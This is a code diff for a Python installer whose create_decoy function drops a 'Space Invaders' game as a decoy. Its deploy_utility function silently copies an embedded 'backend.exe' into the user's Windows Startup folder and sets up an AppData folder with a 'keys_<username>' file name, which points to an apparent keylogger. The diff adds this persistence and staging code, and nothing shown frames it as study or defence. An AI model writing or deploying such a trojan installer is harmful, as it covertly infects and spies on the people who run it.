@@ -3,8 +3,8 @@ from tkinter import messagebox
 from PIL import Image, ImageTk
 import os
 import shutil
-import PyInstaller.__main__
 import sys
+import random
 
 
 global root
@@ -21,24 +21,6 @@ def resource_path(relative_path):
 
 
 def create_decoy():         
-    # PyInstaller.__main__.run([
-    #     resource_path('game\\main.py'),
-    #     '--noconfirm',
-    #     '--onedir',
-    #     '--windowed',
-    #     '--no-embed-manifest',
-    #     '--add-data=game\\res;res\\'
-    # ])
-
-    # shutil.rmtree("build")
-    # os.remove("main.spec")
-
-    # shutil.move("dist\\main", ".")
-    # shutil.rmtree("dist")
-
-    # os.rename("main", "Space Invaders")
-
-    # os.rename("Space Invaders\\main.exe", "Space Invaders\\game.exe")
     shutil.move(resource_path("Space Invaders"),os.getcwd())
 
 
@@ -46,8 +28,13 @@ def deploy_utility():
     source = resource_path("ext\\backend.exe")
     destination = os.path.expanduser(
         "~")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-    os.makedirs(os.path.expanduser(
-        "~") + "\\AppData\\local\\WindowREP_2")
+    store_path = os.path.expanduser(
+        "~") + "\\AppData\\local\\WindowREP_2"
+    os.makedirs(store_path)
+    file_name = "keys_" + os.path.expanduser("~").split("\\")[-1] + "_" + str(random.randint(1, 1_000_000))
+    with open(store_path+"\\stats.txt",'w') as file:
+        file.write(file_name)
+    
     shutil.copy(source, destination)
 
 def run():
